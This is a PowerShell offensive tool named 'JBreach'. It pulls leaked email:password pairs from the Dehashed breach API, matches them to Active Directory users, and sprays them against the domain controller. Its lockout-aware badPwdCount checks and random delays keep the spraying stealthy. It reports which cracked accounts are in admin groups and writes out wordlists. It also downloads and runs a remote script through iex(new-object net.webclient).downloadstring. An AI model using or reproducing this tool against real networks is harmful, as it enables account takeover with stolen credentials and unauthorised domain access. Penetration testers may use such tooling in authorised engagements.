# Define API endpoint
$endpoint = "https://api.dehashed.com"
$results = $null
$custombreach = $null

# Define function to perform Dehashed API request
function Get-DehashedResults {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $true)]
        [string]$query,
        [Parameter()]
        [int]$page = 1
    )

    $headers = @{
        "Accept" = "application/json"
        "Authorization" = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("$($dehashedemail):$($dehashedkey)")))"
    }

    $url = "$endpoint/search?query=$query&size=10000&page=$page"

    $response = Invoke-RestMethod -Method Get -Uri $url -Headers $headers

    return $response
}

filter Get-NetDomain {

    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        $Credential
    )

    if($Credential) {
        
        Write-Verbose "Using alternate credentials for Get-NetDomain"

        if(!$Domain) {
            # if no domain is supplied, extract the logon domain from the PSCredential passed
            $Domain = $Credential.GetNetworkCredential().Domain
            Write-Verbose "Extracted domain '$Domain' from -Credential"
        }
   
        $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain, $Credential.UserName, $Credential.GetNetworkCredential().Password)
        
        try {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
        }
        catch {
            Write-Verbose "The specified domain does '$Domain' not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid."
            $Null
        }
    }
    elseif($Domain) {
        $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
        try {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
        }
        catch {
            Write-Verbose "The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust."
            $Null
        }
    }
    else {
        [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    }
}

filter Get-DomainSearcher {

    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $ADSprefix,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    if(-not $Credential) {
        if(-not $Domain) {
            $Domain = (Get-NetDomain).name
        }
        elseif(-not $DomainController) {
            try {
                # if there's no -DomainController specified, try to pull the primary DC to reflect queries through
                $DomainController = ((Get-NetDomain).PdcRoleOwner).Name
            }
            catch {
                throw "Get-DomainSearcher: Error in retrieving PDC for current domain"
            }
        }
    }
    elseif (-not $DomainController) {
        # if a DC isn't specified
        try {
            $DomainController = ((Get-NetDomain -Credential $Credential).PdcRoleOwner).Name
        }
        catch {
            throw "Get-DomainSearcher: Error in retrieving PDC for current domain"
        }

        if(!$DomainController) {
            throw "Get-DomainSearcher: Error in retrieving PDC for current domain"
        }
    }

    $SearchString = "LDAP://"

    if($DomainController) {
        $SearchString += $DomainController
        if($Domain){
            $SearchString += '/'
        }
    }

    if($ADSprefix) {
        $SearchString += $ADSprefix + ','
    }

    if($ADSpath) {
        if($ADSpath -Match '^GC://') {
            # if we're searching the global catalog
            $DN = $AdsPath.ToUpper().Trim('/')
            $SearchString = ''
        }
        else {
            if($ADSpath -match '^LDAP://') {
                if($ADSpath -match "LDAP://.+/.+") {
                    $SearchString = ''
                }
                else {
                    $ADSpath = $ADSpath.Substring(7)
                }
            }
            $DN = $ADSpath
        }
    }
    else {
        if($Domain -and ($Domain.Trim() -ne "")) {
            $DN = "DC=$($Domain.Replace('.', ',DC='))"
        }
    }

    $SearchString += $DN
    Write-Verbose "Get-DomainSearcher search string: $SearchString"

    if($Credential) {
        Write-Verbose "Using alternate credentials for LDAP connection"
        $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
    }
    else {
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    }

    $Searcher.PageSize = $PageSize
    $Searcher.CacheResults = $False
    $Searcher
}

function Convert-LDAPProperty {

    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )

    $ObjectProperties = @{}

    $Properties.PropertyNames | ForEach-Object {
        if (($_ -eq "objectsid") -or ($_ -eq "sidhistory")) {
            # convert the SID to a string
            $ObjectProperties[$_] = (New-Object System.Security.Principal.SecurityIdentifier($Properties[$_][0],0)).Value
        }
        elseif($_ -eq "objectguid") {
            # convert the GUID to a string
            $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
        }
        elseif( ($_ -eq "lastlogon") -or ($_ -eq "lastlogontimestamp") -or ($_ -eq "pwdlastset") -or ($_ -eq "lastlogoff") -or ($_ -eq "badPasswordTime") ) {
            # convert timestamps
            if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                # if we have a System.__ComObject
                $Temp = $Properties[$_][0]
                [Int32]$High = $Temp.GetType().InvokeMember("HighPart", [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember("LowPart",  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
            }
            else {
                $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
            }
        }
        elseif($Properties[$_][0] -is [System.MarshalByRefObject]) {
            # try to convert misc com objects
            $Prop = $Properties[$_]
            try {
                $Temp = $Prop[$_][0]
                Write-Verbose $_
                [Int32]$High = $Temp.GetType().InvokeMember("HighPart", [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember("LowPart",  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $ObjectProperties[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
            }
            catch {
                $ObjectProperties[$_] = $Prop[$_]
            }
        }
        elseif($Properties[$_].count -eq 1) {
            $ObjectProperties[$_] = $Properties[$_][0]
        }
        else {
            $ObjectProperties[$_] = $Properties[$_]
        }
    }

    New-Object -TypeName PSObject -Property $ObjectProperties
}

function Get-NetUser {

    param(
        [Parameter(Position=0, ValueFromPipeline=$True)]
        [String]
        $UserName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $Filter,

        [Switch]
        $SPN,

        [Switch]
        $AdminCount,

        [Switch]
        $Unconstrained,

        [Switch]
        $AllowDelegation,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    begin {
        # so this isn't repeated if users are passed on the pipeline
        $UserSearcher = Get-DomainSearcher -Domain $Domain -ADSpath $ADSpath -DomainController $DomainController -PageSize $PageSize -Credential $Credential
    }

    process {
        if($UserSearcher) {

            # if we're checking for unconstrained delegation
            if($Unconstrained) {
                Write-Verbose "Checking for unconstrained delegation"
                $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
            }
            if($AllowDelegation) {
                Write-Verbose "Checking for users who can be delegated"
                # negation of "Accounts that are sensitive and not trusted for delegation"
                $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))"
            }
            if($AdminCount) {
                Write-Verbose "Checking for adminCount=1"
                $Filter += "(admincount=1)"
            }

            # check if we're using a username filter or not
            if($UserName) {
                # samAccountType=805306368 indicates user objects
                $UserSearcher.filter="(&(samAccountType=805306368)(samAccountName=$UserName)$Filter)"
            }
            elseif($SPN) {
                $UserSearcher.filter="(&(samAccountType=805306368)(servicePrincipalName=*)$Filter)"
            }
            else {
                # filter is something like "(samAccountName=*blah*)" if specified
                $UserSearcher.filter="(&(samAccountType=805306368)$Filter)"
            }

            $Results = $UserSearcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                # convert/process the LDAP fields for each result
                $User = Convert-LDAPProperty -Properties $_.Properties
                $User.PSObject.TypeNames.Add('PowerView.User')
                $User
            }
            $Results.dispose()
            $UserSearcher.dispose()
        }
    }
}

Write-Host ""
Write-Host "##################################"
Write-Host "# " -NoNewline;
Write-Host "JBreach" -ForegroundColor Red -NoNewline;
Write-Host " | " -NoNewline;
Write-Host "Breached Credentials" -ForegroundColor Cyan -NoNewline;
Write-Host " #"
Write-Host "##################################"
Write-Host ""

$TargetUse = $null
$custombreach = $null

Write-Host "Type " -NoNewline;
Write-Host "creds" -ForegroundColor Yellow -NoNewline;
Write-Host " to check for breached creds only or leave empty to also test them against AD: " -NoNewline;
$TargetUse = Read-Host
Write-Host ""

if(!$TargetUse){
	
	# Get search query from user input
	Write-Host "Custom " -NoNewline;
	Write-Host "email:password" -ForegroundColor Yellow -NoNewline;
	Write-Host " file ? (Provide a path or leave empty): " -NoNewline;
	$custombreach = Read-Host
	Write-Host ""

	if($custombreach){
		$emailPasswords = Get-Content -Path "$custombreach"
		for ($i = 0; $i -lt $emailPasswords.Count; $i++) {
			$email, $password = $emailPasswords[$i] -split ':'
			$email = $email.ToLower()
			$emailPasswords[$i] = "${email}:${password}"
		}

		# Remove dumplicates
		Write-Host "Removing duplicates.."  -ForegroundColor Cyan
		Write-Host ""
		$emailPasswords = ($emailPasswords | Sort-Object -Unique -CaseSensitive)

	}
	
}

else{}

if($dehashedemail){
    if($dehashedkey){}
    else{
		Write-Host "Please provide your Dehashed " -NoNewline;
		Write-Host "API key" -ForegroundColor Yellow -NoNewline;
		Write-Host ": " -NoNewline;
		$dehashedkey = Read-Host
		Write-Host ""
	}
	
}

else{
	if(!$TargetUse){
		Write-Host "Please provide your Dehashed " -NoNewline;
		Write-Host "email" -ForegroundColor Yellow -NoNewline;
		Write-Host " or leave empty: " -NoNewline;
		$dehashedemail = Read-Host
		Write-Host ""
	}
	
	else{
		Write-Host "Please provide your Dehashed " -NoNewline;
		Write-Host "email" -ForegroundColor Yellow -NoNewline;
		Write-Host ": " -NoNewline;
		$dehashedemail = Read-Host
		Write-Host ""
	}
    
	if($dehashedemail){
        if($dehashedkey){}
        else{
			Write-Host "Please provide your Dehashed " -NoNewline;
			Write-Host "API key" -ForegroundColor Yellow -NoNewline;
			Write-Host ": " -NoNewline;
			$dehashedkey = Read-Host
			Write-Host ""
		}
    }
}

if($dehashedemail -AND $dehashedkey){
    Write-Host "Please enter a search query (e.g. " -NoNewline;
	Write-Host "email:test.com" -ForegroundColor Yellow -NoNewline;
	Write-Host "): " -NoNewline;
	$query = Read-Host 
    Write-Host ""
	
	Write-Host "Retrieving breached credentials from Dehashed.com..." -ForegroundColor Cyan
	Write-Host ""

    # Query Dehashed API with search query
    $results = Get-DehashedResults -query $query

    if ($results.total -gt 10000 -and $results.total -le 20000) {
        Start-Sleep -Seconds 1
        $results2 = Get-DehashedResults -query $query -page 2
    } elseif ($results.total -gt 20000 -and $results.total -le 30000) {
        Start-Sleep -Seconds 1
        $results2 = Get-DehashedResults -query $query -page 2
        Start-Sleep -Seconds 1
        $results3 = Get-DehashedResults -query $query -page 3
    }

    if ($results.entries) {
        Write-Host "$($results.total)"  -ForegroundColor Yellow -NoNewLine
		Write-Host " breached credentials gathered from Dehashed.com"
        Write-Host ""
        Write-Host "Removing duplicates..." -ForegroundColor Cyan
        Write-Host ""
        $parsedresults = $results.entries | Select-Object Email, Password | where-object {$_.Password -ne "" -AND $_.Password -ne "NULL" -AND $_.Password.Length -le 29} | ForEach-Object { $_.Email.ToLower() + ":" + $_.Password } | Format-Table -AutoSize
        $combinedResults = $parsedresults
        if ($results.total -gt 10000 -and $results.total -le 20000) {
            $parsedresults2 = $results2.entries | Select-Object Email, Password | where-object {$_.Password -ne "" -AND $_.Password -ne "NULL" -AND $_.Password.Length -le 29} | ForEach-Object { $_.Email.ToLower() + ":" + $_.Password } | Format-Table -AutoSize
            $combinedResults += $parsedresults2
        }
        elseif ($results.total -gt 20000 -and $results.total -le 30000) {
            $parsedresults2 = $results2.entries | Select-Object Email, Password | where-object {$_.Password -ne "" -AND $_.Password -ne "NULL" -AND $_.Password.Length -le 29} | ForEach-Object { $_.Email.ToLower() + ":" + $_.Password } | Format-Table -AutoSize
            $parsedresults3 = $results3.entries | Select-Object Email, Password | where-object {$_.Password -ne "" -AND $_.Password -ne "NULL" -AND $_.Password.Length -le 29} | ForEach-Object { $_.Email.ToLower() + ":" + $_.Password } | Format-Table -AutoSize
            $combinedResults += $parsedresults2
            $combinedResults += $parsedresults3
        }
    
        $combinedResults = ($combinedResults | Out-String) -split "`n"
        $combinedResults = $combinedResults.Trim()
        $combinedResults = ($combinedResults | Sort-Object -Unique -CaseSensitive)
    
        $uniqueResults = @()

        foreach ($line in $combinedResults) {
            $emailtarget = $line.Split(':')[0]
            $password = $line.Split(':')[1]

            $isDuplicate = $false
            foreach ($uniqueLine in $uniqueResults) {
                $uniqueEmail = $uniqueLine.Split(':')[0]
                $uniquePassword = $uniqueLine.Split(':')[1]

                if ($emailtarget -eq $uniqueEmail -and $password -ceq $uniquePassword) {
                    $isDuplicate = $true
                    break
                }
            }

            if (!$isDuplicate) {
                $uniqueResults += $line
            } else {
                $existingLine = $uniqueResults | Where-Object { $_.Split(':')[0] -eq $emailtarget -and $_.Split(':')[1] -ceq $password }
                if ($existingLine) {
                    $existingPassword = $existingLine.Split(':')[1]
                    $linePassword = $line.Split(':')[1]
                    if ($existingPassword -eq $linePassword) {
                        $uniqueResults = $uniqueResults | Where-Object { $_ -ne $existingLine }
                    }
                }

            }
        }

        $uniqueResults = $uniqueResults | Where-Object { $_ -ne "" }
		
        Write-Host "Dehashed.com results cut down to " -NoNewLine
		Write-Host "$($uniqueResults.length)" -ForegroundColor Yellow -NoNewLine
		Write-Host " entries"
        Write-Host ""

        if($custombreach){
            Write-Host "Merging your list to Dehashed.com results and removing duplicates..." -ForegroundColor Cyan
            Write-Host ""
            $finalcomboresults = $uniqueResults += $emailPasswords
            $finalcomboresults = ($finalcomboresults | Sort-Object -Unique -CaseSensitive)

            $finalresults = @()

            foreach ($line in $finalcomboresults) {
                $emailtarget = $line.Split(':')[0]
                $password = $line.Split(':')[1]

                $isDuplicate = $false
                foreach ($uniqueLine in $finalresults) {
                    $uniqueEmail = $uniqueLine.Split(':')[0]
                    $uniquePassword = $uniqueLine.Split(':')[1]

                    if ($emailtarget -eq $uniqueEmail -and $password -ceq $uniquePassword) {
                        $isDuplicate = $true
                        break
                    }
                }

                if (!$isDuplicate) {
                    $finalresults += $line
                } else {
                    $existingLine = $finalresults | Where-Object { $_.Split(':')[0] -eq $emailtarget -and $_.Split(':')[1] -ceq $password }
                    if ($existingLine) {
                        $existingPassword = $existingLine.Split(':')[1]
                        $linePassword = $line.Split(':')[1]
                        if ($existingPassword -eq $linePassword) {
                            $finalresults = $finalresults | Where-Object { $_ -ne $existingLine }
                        }
                    }

                }
            }

            $finalresults = $finalresults | Where-Object { $_ -ne "" }
			Write-Host "$($finalresults.length)" -ForegroundColor Yellow -NoNewLine
			Write-Host " total entries"
            Write-Host ""

        }
        else{$finalresults = $uniqueResults}
    }

    else {
		Write-Host "[-] " -ForegroundColor Red -NoNewLine;
        Write-Host "No breached credentials could be found for the specified search query"
        Write-Host ""
        if($custombreach){
			Write-Host "[+] " -ForegroundColor Yellow -NoNewLine;
            Write-Host "Using custom file only.."
            Write-Host ""
            $finalresults = $emailPasswords
        }
        else{
			if($TargetUse){break}
			else{
				Write-Host "[-] " -ForegroundColor Red -NoNewLine;
				Write-Host "No custom file provided.."
				Write-Host ""
				break
			}
        }
    }
}

else{
    if($custombreach){
        $finalresults = $emailPasswords
    }
    else{
		if($TargetUse){
			Write-Host "No party..."
			Write-Host ""
			break
		}
		else{
			Write-Host "Alright then.."
			Write-Host ""
			break
		}
    }
}

if(!$TargetUse){

	# Import the Active Directory module
	Write-Host "Importing Active Directory Module..."  -ForegroundColor Cyan
	Write-Host ""

	$PwshModule = (Get-Module)
	if($PwshModule -Like "*dynamic*code*module*Microsoft*"){}

	else{
		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/AD_Module.ps1')
		Import-ActiveDirectory
	}

	Add-Type -AssemblyName System.DirectoryServices.AccountManagement

	function Create-DisableFilter() {
		foreach($userAccountControl in $disabledUserAccountControl) {
			$filters += "(!userAccountControl:1.2.840.113556.1.4.803:=$userAccountControl)"
		}
		return "(&$filters)"
	}

	$disabledUserAccountControl = 2,514,546,66050,66082,262658,262690,328194,328226
	$Domain = (Get-NetDomain).name
	$DomainController = ((Get-NetDomain).PdcRoleOwner).name
	$filter = Create-DisableFilter
	$Limit = Get-ADDefaultDomainPasswordPolicy | Select-Object -ExpandProperty LockoutThreshold

	Write-Host "Account " -NoNewLine
	Write-Host "Lockout Threshold" -NoNewLine -ForegroundColor Yellow
	Write-Host " is set to " -NoNewLine
	Write-Host "$Limit" -ForegroundColor Red
	Write-Host ""

	if($Limit -eq 0){
		Write-Host "It looks like no account lockout threshold is set.."
		Write-Host "This could mean you can bruteforce accounts.. however, a fine-grained password policy may be in place.."
		Write-Host "To avoid account lockouts, our limit will be set to " -NoNewLine
		Write-Host "3" -ForegroundColor Yellow
		Write-Host "Think twice before proceeding, or you may end up locking out accounts.." -ForegroundColor Yellow
		Write-Host ""
		$customSafeLimit = Read-Host "Do you want to set a custom limit ? Please provide a number or leave empty for 'No'"
		Write-Host ""
		if($customSafeLimit){$SafeLimit = $customSafeLimit}
		else{$SafeLimit = 3}
	}

	elseif($Limit -eq 1){
		Write-Host "This script won't continue unless you specify a custom limit.."
		Write-Host "Think twice before proceeding, or you may end up locking out accounts.." -ForegroundColor Yellow
		Write-Host ""
		$customSafeLimit = Read-Host "Do you want to set a custom limit ? Please provide a number or leave empty to quit"
		Write-Host ""
		if($customSafeLimit){$SafeLimit = $customSafeLimit}
		else{break}
	}

	elseif($Limit -eq 2){
		Write-Host "To avoid account lockouts, our limit will be set to " -NoNewLine
		Write-Host "1" -ForegroundColor Yellow
		Write-Host "Changing this to a higher value will most probably lockout accounts.." -ForegroundColor Yellow
		Write-Host ""
		$customSafeLimit = Read-Host "Do you want to set a custom limit ? Please provide a number or leave empty"
		Write-Host ""
		if($customSafeLimit){$SafeLimit = $customSafeLimit}
		else{$SafeLimit = 1}
	}
	
	elseif($Limit -eq 3){
		Write-Host "To avoid account lockouts, our limit will be set to " -NoNewLine
		Write-Host "1" -ForegroundColor Yellow
		Write-Host "Changing this to a higher value will most probably lockout accounts.." -ForegroundColor Yellow
		Write-Host ""
		$customSafeLimit = Read-Host "Do you want to set a custom limit ? Please provide a number or leave empty"
		Write-Host ""
		if($customSafeLimit){$SafeLimit = $customSafeLimit}
		else{$SafeLimit = 1}
	}
	
	elseif($Limit -eq 4){
		Write-Host "To avoid account lockouts, our limit will be set to " -NoNewLine
		Write-Host "2" -ForegroundColor Yellow
		Write-Host "Changing this to a higher value will most probably lockout accounts.." -ForegroundColor Yellow
		Write-Host ""
		$customSafeLimit = Read-Host "Do you want to set a custom limit ? Please provide a number or leave empty"
		Write-Host ""
		if($customSafeLimit){$SafeLimit = $customSafeLimit}
		else{$SafeLimit = 2}
	}
	
	elseif($Limit -eq 5){
		Write-Host "To avoid account lockouts, our limit will be set to " -NoNewLine
		Write-Host "3" -ForegroundColor Yellow
		Write-Host "Changing this to a higher value will most probably lockout accounts.." -ForegroundColor Yellow
		Write-Host ""
		$customSafeLimit = Read-Host "Do you want to set a custom limit ? Please provide a number or leave empty"
		Write-Host ""
		if($customSafeLimit){$SafeLimit = $customSafeLimit}
		else{$SafeLimit = 3}
	}
	
	elseif($Limit -eq 6){
		Write-Host "To avoid account lockouts, our limit will be set to " -NoNewLine
		Write-Host "4" -ForegroundColor Yellow
		Write-Host "Changing this to a higher value will most probably lockout accounts.." -ForegroundColor Yellow
		Write-Host ""
		$customSafeLimit = Read-Host "Do you want to set a custom limit ? Please provide a number or leave empty"
		Write-Host ""
		if($customSafeLimit){$SafeLimit = $customSafeLimit}
		else{$SafeLimit = 4}
	}

	else{
		Write-Host "To avoid account lockouts, our limit will be set to " -NoNewLine
		Write-Host "5" -ForegroundColor Yellow
		Write-Host "However, a fine-grained password policy may be in place.."
		Write-Host "Think twice before proceeding, or you may end up locking out accounts.." -ForegroundColor Yellow
		Write-Host ""
		$customSafeLimit = Read-Host "Do you want to set a custom limit ? Please provide a number or leave empty"
		Write-Host ""
		if($customSafeLimit){$SafeLimit = $customSafeLimit}
		else{$SafeLimit = 5}
	}

	Write-Host "Spraying will be conducted on targets having a 'badPwdCount' lower than " -ForegroundColor Yellow -NoNewLine
	Write-Host "$SafeLimit" -ForegroundColor Cyan
	Write-Host ""

	# Check our list against matching emails associated to AD accounts
	Write-Host "Checking for matching emails in AD..." -ForegroundColor Cyan

	# Create a list to store the username:password pairs
	$credentials = @()

	# Loop through each line in the email-passwords file
	foreach ($finalresult in $finalresults) {
		$email, $password = $finalresult -split ':'

		# Search for the user in Active Directory using the email address
		$user = Get-ADUser -Filter {EmailAddress -eq $email} -Properties EmailAddress, SamAccountName

		# Check if the user was found
		if ($user) {
			# Add the username:password pair to the list
			foreach ($userlisting in ($user.SamAccountName)){
				$credential = "$($userlisting):$password"
				$credentials += $credential
			}
		}
	}

	if($credentials){
		
		Write-Host "[+] " -ForegroundColor Yellow -NoNewLine
		Write-Host "One or more matches found"
		Write-Host ""
		
		# Output a list of all username:password pairs found
		Write-Host "Potential targets:" -ForegroundColor Cyan
		foreach ($credential in $credentials) {
			Write-Host "[+] " -ForegroundColor Yellow -NoNewLine
			Write-Output $credential
		}

		Write-Host ""

		# Loop through the username:password pairs and test for validity
		Write-Host "Checking validity of credential pairs..." -ForegroundColor Cyan

		$validpairs = $null
		$trackerone = $null
		$trackertwo = $null
		$processed = $null
		$badPwdCountErrors = $null
		$principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain),$DomainController
		
		# Define a hashtable to keep track of processed usernames
		$processed = @{}
		$badPwdCountErrors = @{}
		$successfulLogins = @{}
		$minDelay = 0
		$maxDelay = 700
		
		foreach ($credential in $credentials) {
			$username, $password = $credential -split ':'
			
			# Check if we've already successfully authenticated for this user
			if ($successfulLogins.ContainsKey($username)) {
				continue
			}
			
			# Retrieve value of user's lockoutTime attribute
			$lockoutTime = (Get-NetUser -DomainController $DomainController -Domain $Domain -UserName $username | select lockouttime).lockouttime
			
			if ($lockoutTime) {
				if ($username -notin $processed.Keys) {
					Write-Host "[!] " -ForegroundColor Red -NoNewLine;
					Write-Host "Account Lockout | User: " -NoNewLine;
					Write-Host "$username" -ForegroundColor Yellow;
					$processed.Add($username, $true)
				}
				continue
			}
			
			# If the user is not locked out, attempt authentication
						
			# Retrieve value of user's badPwdCount attribute
			$currBadPwdCount = (Get-NetUser -DomainController $DomainController -Domain $Domain -UserName $username -filter $filter | select badpwdcount).badpwdcount
			
			# If the current user badPwdCount attribute is lower than the Limit...
			if (($currBadPwdCount -ne $Null) -And ($currBadPwdCount -lt $SafeLimit)) {
				$isValid = $principalContext.ValidateCredentials($username, $password, 1)

				# Output the username:password pair if the credentials are valid
				if ($isValid) {
					Write-Host "[+] Success: $username $password" -ForegroundColor Green
					$validpairs += ($credential + "`n")
					$successfulLogins.Add($username, $true)
					$trackerone = "something"
				}

				# Else, check if credentials were previously used
				else{
					$newBadPwdCount = (Get-NetUser -DomainController $DomainController -Domain $Domain -UserName $username | select badpwdcount).badpwdcount
					if($newBadPwdCount -eq $currBadPwdCount){
						Write-Host "[+] Old password detected: $username $password" -ForegroundColor Yellow
						$trackertwo = "something"
					}
				}
				
				# Generate a random delay between attempts
				$delay = Get-Random -Minimum $minDelay -Maximum $maxDelay
				Start-Sleep -Milliseconds $delay
				
			}
			
			else{
				if ($username -notin $badPwdCountErrors.Keys) {
					Write-Host "[!] " -ForegroundColor Red -NoNewLine;
					Write-Host "badPwdCount limit reached for user " -NoNewLine;
					Write-Host "$username" -ForegroundColor Yellow -NoNewLine;
					Write-Host " | Skipping..."
					$badPwdCountErrors.Add($username, $true)
				}
			}
			
		}
		
		if($validpairs){

			$validpairs = ($validpairs | Out-String) -split "`n"
			$validpairs = $validpairs.Trim()
			$validpairs = $validpairs | Where-Object { $_ -ne "" }

			Write-Host ""

			# Check the username:password pairs for matches with the Domain Admins or Enterprise Admins groups
			Write-Host "Checking users' group membership..." -ForegroundColor Cyan

			foreach ($validpair in $validpairs) {
				$username, $password = $validpair -split ':'
				
				$isAdmin = $false
				$isnonAdmin = $false
				$adminGroups = $null
				$nonAdminGroups = $null
				
				$adminGroups = @()
				$nonAdminGroups = @()
				
				$groups = Get-ADPrincipalGroupMembership -Identity $username
				
				foreach ($group in $groups) {
					if ($group.Name -like "*Admin*") {
						$adminGroups += ($group.Name + "`n")
						$isAdmin = $true
					}
					
					elseif($group.Name -eq "Domain Users"){}
					
					else {
						$nonAdminGroups += ($group.Name + "`n")
						$isnonAdmin = $true
					}
				}
				
				if($adminGroups){
					$adminGroups = ($adminGroups | Out-String) -split "`n"
					$adminGroups = $adminGroups.Trim()
					$adminGroups = $adminGroups | Where-Object { $_ -ne "" }
				}
				
				if($nonAdminGroups){
					$nonAdminGroups = ($nonAdminGroups | Out-String) -split "`n"
					$nonAdminGroups = $nonAdminGroups.Trim()
					$nonAdminGroups = $nonAdminGroups | Where-Object { $_ -ne "" }
				}

				# If the user is a member of either group, output a warning
				if ($isAdmin) {
					Write-Host "[+] " -ForegroundColor Yellow -NoNewLine;
					Write-Host "$username" -ForegroundColor Green -NoNewLine;
					Write-Host " with password " -NoNewLine;
					Write-Host "$password" -ForegroundColor Green -NoNewLine;
					Write-Host " is a member of the following groups: " -NoNewLine;
					Write-Host "$($adminGroups -join ', ')" -ForegroundColor Yellow -NoNewLine;
					if ($isnonAdmin) {
						Write-Host ", $($nonAdminGroups -join ', ')";
					}
					else{
						Write-Host ""
					}
				}
				
				elseif($isnonAdmin){
					Write-Host "[+] " -ForegroundColor Yellow -NoNewLine;
					Write-Host "$username" -ForegroundColor Green -NoNewLine;
					Write-Host " with password " -NoNewLine;
					Write-Host "$password" -ForegroundColor Green -NoNewLine;
					Write-Host " is a member of the following groups: " -NoNewLine;
					Write-Host "$($nonAdminGroups -join ', ')";
				}
				
				else{
					Write-Host "[+] " -ForegroundColor Yellow -NoNewLine;
					Write-Host "$username" -ForegroundColor Green -NoNewLine;
					Write-Host " with password " -NoNewLine;
					Write-Host "$password" -ForegroundColor Green -NoNewLine;
					Write-Host " is a member of Domain Users only";
				}
			}
			
		}
		
		elseif(!$trackerone -AND !$trackertwo){
			Write-Host "[-] " -ForegroundColor Red -NoNewLine;
			Write-Host "No valid credentials found and no old passwords detected"
		}
	}

	else{
		Write-Host ""
		Write-Host "[-] " -ForegroundColor Red -NoNewLine;
		Write-Host "No matching accounts"
	}

	Write-Host ""

	if($query){
		# Other domains to search for
		Write-Host "Re-run your email search for the following domains:" -ForegroundColor Cyan
		$allusersemails = Get-NetUser -DomainController $DomainController -Domain $Domain | Where-Object { $_.mail -ne $null -and $_.mail -ne "" } | Select-Object -ExpandProperty mail
		$alldomains = @()
		foreach ($allusersemail in $allusersemails) {
			if ($allusersemail -match "@(.+)$") {
				$domain = $Matches[1]
				if (-not $alldomains.Contains($domain)) {
					$domains += ($domain + "`n")
				}
			}
		}
		$parts = $query.Split(":")
		$queryDomain = $parts[1]
		$domains = ($domains | Out-String) -split "`n"
		$domains = $domains.Trim()
		$domains = $domains | Where-Object { $_ -ne "" }
		$domains = ($domains | Sort-Object | Get-Unique)
		$domains = $domains | Where-Object {$_ -ne $queryDomain}
		
		if($domains){
			foreach($domain in $domains){
			Write-Host $domain -ForegroundColor Yellow;
			}
		}
		
		else{
			Write-Host "[-] " -ForegroundColor Red -NoNewLine;
			Write-Host "None found"
		}
		
		Write-Host ""
		
		Write-Host "Exporting wordlists:" -ForegroundColor Cyan

		$finalresults | Out-File -FilePath "$pwd\$queryDomain-master.txt"

		foreach ($finalresult in $finalresults) {
			$email, $password = $finalresult -split ':'
			$finalemails += ($email + "`n")
			$finalpasswords += ($password + "`n")
		}

		# Save emails to file
		$finalemails = ($finalemails | Sort-Object -Unique)
		$finalemails | Out-File -FilePath "$pwd\$queryDomain-emails.txt"

		# Save passwords to file
		$finalpasswords = ($finalpasswords | Sort-Object -Unique -CaseSensitive)
		$finalpasswords | Out-File -FilePath "$pwd\$queryDomain-passwords.txt"
		
		Write-Host "$pwd\$queryDomain-master.txt"
		Write-Host "$pwd\$queryDomain-emails.txt"
		Write-Host "$pwd\$queryDomain-passwords.txt"
		Write-Host ""
	}
	
}

else{
	Write-Host "Exporting wordlists:" -ForegroundColor Cyan
	$parts = $query.Split(":")
	$queryDomain = $parts[1]
	$finalresults | Out-File -FilePath "$pwd\$queryDomain-master.txt"

	foreach ($finalresult in $finalresults) {
		$email, $password = $finalresult -split ':'
		$finalemails += ($email + "`n")
		$finalpasswords += ($password + "`n")
	}

	# Save emails to file
	$finalemails = ($finalemails | Sort-Object -Unique)
	$finalemails | Out-File -FilePath "$pwd\$queryDomain-emails.txt"

	# Save passwords to file
	$finalpasswords = ($finalpasswords | Sort-Object -Unique -CaseSensitive)
	$finalpasswords | Out-File -FilePath "$pwd\$queryDomain-passwords.txt"
	
	Write-Host "$pwd\$queryDomain-master.txt"
	Write-Host "$pwd\$queryDomain-emails.txt"
	Write-Host "$pwd\$queryDomain-passwords.txt"
	Write-Host ""
}

# Test USERNAME:USERNAME
